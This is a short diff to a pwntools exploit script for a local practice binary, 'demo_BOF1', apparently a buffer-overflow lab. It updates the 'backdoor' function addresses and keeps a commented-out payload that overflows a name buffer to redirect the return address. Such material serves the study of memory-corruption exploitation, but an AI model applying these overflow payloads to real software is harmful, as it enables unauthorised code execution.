@@ -5,8 +5,8 @@ context.terminal = ['tmux', 'splitw', '-h']
 
 r = process('./demo_BOF1')
 
-backdoor_addr = 0x401156
-no_push_rbp_backdoor_addr = 0x401157
+backdoor_addr = 0x401196
+no_push_rbp_backdoor_addr = 0x40119b
 
 gdb.attach(r)
 # r.sendafter("What's your name: ", b'a' * 0x10 + b'a' * 0x8 + p64(backdoor_addr))
